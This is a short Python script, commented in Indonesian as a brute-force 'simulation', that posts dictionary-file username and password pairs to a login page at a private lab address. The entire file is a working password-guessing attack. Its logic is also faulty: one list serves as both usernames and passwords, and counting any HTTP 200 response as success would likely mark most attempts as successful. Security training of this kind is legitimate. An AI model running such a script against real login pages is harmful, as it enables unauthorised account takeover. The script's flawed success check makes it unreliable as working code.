import requests

url = "http://10.8.0.111:80/codelab/index.php/auth" # Sesuaikan URL

# Membaca daftar password dari file
with open("dictionary.txt", "r") as file:
    username = passwords = file.read().splitlines()

print("Memulai simulasi Brute Force...\n")

for adm in username:
    for pwd in passwords:
        data = {"username": adm, "password": pwd}
        response = requests.post(url, data=data)
        
        if "Login Berhasil!" in response.text or response.status_code == 200:
            print(f"[SUKSES] Username: {adm} Password: {pwd}")